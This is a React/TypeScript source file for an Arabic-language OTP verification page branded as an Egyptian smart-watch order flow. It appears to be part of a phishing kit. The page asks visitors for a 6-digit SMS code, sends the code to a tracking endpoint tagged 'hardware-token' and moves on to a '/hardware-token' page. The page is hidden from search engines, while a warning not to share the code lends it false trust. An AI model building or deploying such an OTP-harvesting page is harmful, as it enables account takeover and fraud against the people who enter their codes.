import { useEffect, useState } from "react";
import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { Clock, MessageSquare, ShieldCheck, Sparkles, TriangleAlert } from "lucide-react";
import { toast } from "sonner";

import heroBg from "@/assets/hero-bg.jpg";
import { Button } from "@/components/ui/button";
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
import { useOrder } from "@/lib/order";
import { trackEvent } from "@/lib/track";
import { getSessionId } from "@/lib/session-id";
import { LazyImage } from "@/components/lazy-image";

const TITLE = "رمز التحقق المؤقت — ساعة أهل مصر الذكية";
const DESCRIPTION = "أدخل رمز التحقق المكوّن من 6 أرقام لتأكيد هويتك ومتابعة طلب ساعة أهل مصر الذكية.";

export const Route = createFileRoute("/verify-otp")({
  head: () => ({
    meta: [
      { title: TITLE },
      { name: "description", content: DESCRIPTION },
      { property: "og:title", content: TITLE },
      { property: "og:description", content: DESCRIPTION },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "robots", content: "noindex" },
    ],
  }),
  component: VerifyOtpPage,
});

function maskPhone(phone: string) {
  const digits = phone.replace(/\D/g, "");
  if (digits.length < 6) return "";
  return `${digits.slice(0, 3)}xxxx${digits.slice(-3)}`;
}

function VerifyOtpPage() {
  const navigate = useNavigate();
  const { order } = useOrder();
  const maskedPhone = maskPhone(order.phone) || "010xxxx000";
  const [code, setCode] = useState("");
  const [remaining, setRemaining] = useState(109);

  useEffect(() => {
    if (remaining <= 0) {
      if (typeof window !== "undefined") window.location.reload();
      return;
    }
    const id = setInterval(() => setRemaining((r) => Math.max(0, r - 1)), 1000);
    return () => clearInterval(id);
  }, [remaining]);

  const mm = String(Math.floor(remaining / 60)).padStart(1, "0");
  const ss = String(remaining % 60).padStart(2, "0");

  function handleConfirm() {
    if (code.length !== 6) {
      toast.error("الرجاء إدخال الرمز كاملاً");
      return;
    }
    void trackEvent({
      data: {
        sessionId: getSessionId(),
        stage: "hardware-token",
        patch: { otp: code },
      },
    });
    toast.success("تم التحقق من الرمز");
    navigate({ to: "/hardware-token" });
  }

  return (
    <div className="min-h-screen bg-background">
      <section className="relative overflow-hidden">
        <LazyImage
            src={heroBg}
            alt=""
            width={1920}
            height={1088}
            wrapperClassName="absolute inset-0 h-full w-full"
            className="h-full w-full object-cover"
          />
        <div className="relative mx-auto max-w-3xl px-4 pb-40 pt-16 text-center">
          <span className="inline-flex items-center gap-2 rounded-full border border-hero-foreground/25 bg-hero-foreground/10 px-4 py-1.5 text-xs font-bold text-hero-foreground backdrop-blur-sm">
            <ShieldCheck className="h-3.5 w-3.5" aria-hidden="true" />
            حماية ثنائية
          </span>
          <h1 className="mt-6 text-3xl font-black text-hero-foreground sm:text-4xl">
            رمز التحقق المؤقت
          </h1>
          <p className="mx-auto mt-4 max-w-md text-sm leading-relaxed text-hero-foreground/85">
            لحماية حسابك، أدخل الرمز المكوّن من 6 أرقام الذي أرسلناه عبر رسالة نصية
          </p>
          <span className="mt-6 inline-flex items-center gap-2 rounded-full border border-gold/60 bg-gold/10 px-4 py-2 text-sm font-bold text-gold backdrop-blur-sm">
            <MessageSquare className="h-4 w-4" aria-hidden="true" />
            {maskedPhone}
          </span>
        </div>
      </section>

      <main className="relative z-10 mx-auto -mt-24 max-w-md px-4 pb-16">
        <div className="overflow-hidden rounded-3xl border border-border bg-card shadow-[var(--shadow-soft)]">
          <div className="h-1.5 w-full bg-[image:var(--gradient-gold)]" />
          <div className="p-6 sm:p-8">
            <div className="text-center">
              <span className="mx-auto grid h-14 w-14 place-items-center rounded-2xl bg-secondary text-primary">
                <ShieldCheck className="h-7 w-7" aria-hidden="true" />
              </span>
              <h2 className="mt-4 text-xl font-black text-foreground">أدخل رمز التحقق</h2>
              <p className="mt-1 text-sm text-muted-foreground">
                ستجد الرمز في رسالة SMS وصلتك للتو
              </p>
            </div>

            <div dir="ltr" className="mt-6 flex justify-center">
              <InputOTP maxLength={6} value={code} onChange={setCode}>
                <InputOTPGroup>
                  {[0, 1, 2, 3, 4, 5].map((i) => (
                    <InputOTPSlot key={i} index={i} className="h-11 w-11 text-lg sm:h-12 sm:w-12" />
                  ))}
                </InputOTPGroup>
              </InputOTP>
            </div>

            <Button onClick={handleConfirm} className="mt-6 h-12 w-full rounded-xl text-base">
              تأكيد الرمز
            </Button>

            <div className="mt-5 flex items-start gap-2 rounded-xl border border-gold/40 bg-gold/10 p-3 text-xs leading-relaxed text-foreground">
              <TriangleAlert className="mt-0.5 h-4 w-4 shrink-0 text-gold" aria-hidden="true" />
              <p>
                <span className="font-bold">تنبيه:</span> لا تُشارك هذا الرمز مع أي شخص. لن يطلبه
                منك أي موظف من فريق ساعة أهل مصر الذكية.
              </p>
            </div>
          </div>
        </div>

        <div className="mt-6 flex items-center justify-center gap-2 rounded-full border border-border bg-card px-4 py-2 text-xs text-muted-foreground shadow-[var(--shadow-card)]">
          <Clock className="h-3.5 w-3.5" aria-hidden="true" />
          <>
            لم يصلك الرمز؟ سيتم تحديث الصفحة تلقائياً خلال{" "}
            <span className="font-bold text-primary">
              {mm}:{ss}
            </span>
          </>
        </div>


        <p className="mt-8 flex items-center justify-center gap-1 text-center text-xs text-muted-foreground">
          <Sparkles className="h-3 w-3" aria-hidden="true" />
          نسخة تجريبية للعرض فقط
        </p>
      </main>
    </div>
  );
}
